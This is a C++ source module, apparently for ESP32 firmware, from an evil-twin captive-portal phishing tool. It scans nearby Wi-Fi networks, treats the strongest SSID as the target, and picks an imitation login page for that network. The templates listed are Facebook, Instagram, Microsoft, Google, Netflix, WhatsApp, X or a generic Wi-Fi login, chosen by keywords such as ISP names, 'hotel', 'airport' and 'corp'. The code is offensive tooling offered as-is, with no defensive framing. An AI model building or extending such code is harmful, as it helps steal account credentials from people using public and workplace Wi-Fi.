#include "auto_portal.h"

extern String logBuffer;
extern void addLog(const String& msg);

AutoPortalModule::AutoPortalModule() {
    scanning = false;
    lastScan = 0;
    popularClientCount = 0;
    networkCount = 0;
}

void AutoPortalModule::begin() {
    addLog("[AUTO_PORTAL] Modulo iniciado");
}

void AutoPortalModule::startAutoScan() {
    scanning = true;
    addLog("[AUTO_PORTAL] Escaneo automatico iniciado");
}

void AutoPortalModule::stopAutoScan() {
    scanning = false;
    addLog("[AUTO_PORTAL] Escaneo automatico detenido");
}

bool AutoPortalModule::isScanning() {
    return scanning;
}

String AutoPortalModule::getMostPopularSSID() {
    return popularSSID;
}

int AutoPortalModule::getMostPopularClientCount() {
    return popularClientCount;
}

String AutoPortalModule::getScanResultsJSON() {
    String json = "[";
    for (int i = 0; i < networkCount; i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"ssid\":\"" + networks[i].ssid + "\",";
        json += "\"clients\":" + String(networks[i].clientCount) + ",";
        json += "\"rssi\":" + String(networks[i].rssi);
        json += "}";
    }
    json += "]";
    return json;
}

void AutoPortalModule::scanNetworks() {
    int n = WiFi.scanNetworks();
    networkCount = 0;
    
    for (int i = 0; i < n && networkCount < 20; i++) {
        networks[networkCount].ssid = WiFi.SSID(i);
        networks[networkCount].clientCount = 0; // Would need packet analysis
        networks[networkCount].rssi = WiFi.RSSI(i);
        networkCount++;
    }
    
    WiFi.scanDelete();
}

void AutoPortalModule::analyzeResults() {
    if (millis() - lastScan < 10000) return;
    lastScan = millis();

    scanNetworks();

    // Find the network with best signal (most likely to be the target)
    int bestRSSI = -100;
    for (int i = 0; i < networkCount; i++) {
        if (networks[i].rssi > bestRSSI && networks[i].ssid.length() > 0) {
            bestRSSI = networks[i].rssi;
            popularSSID = networks[i].ssid;
            popularClientCount = networks[i].clientCount;
        }
    }

    if (popularSSID.length() > 0) {
        addLog("[AUTO_PORTAL] Red mas popular: " + popularSSID + " (" + String(bestRSSI) + "dBm)");
    }
}

// ---------------------------------------------------------------------------
// Template suggestion based on SSID keyword matching
// Template indices: 0=Facebook 1=Instagram 2=Microsoft 3=X/Twitter
//                   4=Google   5=WiFiLogin 6=Netflix   7=WhatsApp
// ---------------------------------------------------------------------------

int AutoPortalModule::suggestTemplate(const String& ssid) {
    String s = ssid;
    s.toLowerCase();

    // Social media
    if (s.indexOf("facebook") != -1 || s.indexOf("fb-") != -1 || s.indexOf("-fb") != -1)
        return 0;
    if (s.indexOf("instagram") != -1 || s.indexOf("insta") != -1)
        return 1;
    if (s.indexOf("twitter") != -1 || s.indexOf("twit") != -1)
        return 3;
    if (s.indexOf("netflix") != -1)
        return 6;
    if (s.indexOf("whatsapp") != -1 || s.indexOf("whats") != -1)
        return 7;
    if (s.indexOf("google") != -1 || s.indexOf("goog-") != -1)
        return 4;

    // Corporate / enterprise
    if (s.indexOf("microsoft") != -1 || s.indexOf("msft") != -1 ||
        s.indexOf("office") != -1   || s.indexOf("corp") != -1  ||
        s.indexOf("empresa") != -1  || s.indexOf("work") != -1  ||
        s.indexOf("staff") != -1    || s.indexOf("employee") != -1 ||
        s.indexOf("admin") != -1)
        return 2;

    // ISP / generic WiFi (most common) → WiFi Login
    if (s.indexOf("wifi") != -1  || s.indexOf("wi-fi") != -1 ||
        s.indexOf("hotspot") != -1 || s.indexOf("guest") != -1 ||
        s.indexOf("free") != -1  || s.indexOf("public") != -1 ||
        s.indexOf("internet") != -1 || s.indexOf("acceso") != -1 ||
        s.indexOf("telcel") != -1  || s.indexOf("telmex") != -1 ||
        s.indexOf("infinitum") != -1 || s.indexOf("megacable") != -1 ||
        s.indexOf("izzi") != -1   || s.indexOf("totalplay") != -1 ||
        s.indexOf("axtel") != -1  || s.indexOf("movistar") != -1 ||
        s.indexOf("att") != -1    || s.indexOf("claro") != -1   ||
        s.indexOf("starbucks") != -1 || s.indexOf("airport") != -1 ||
        s.indexOf("hotel") != -1  || s.indexOf("plaza") != -1   ||
        s.indexOf("mall") != -1   || s.indexOf("centro") != -1)
        return 5;

    // Default: WiFi Login (generic, most versatile)
    return 5;
}

String AutoPortalModule::getTemplateNameFor(const String& ssid) {
    static const char* names[] = {
        "Facebook", "Instagram", "Microsoft", "X (Twitter)",
        "Google",   "WiFi Login", "Netflix",  "WhatsApp"
    };
    int idx = suggestTemplate(ssid);
    if (idx >= 0 && idx < 8) return String(names[idx]);
    return "WiFi Login";
}

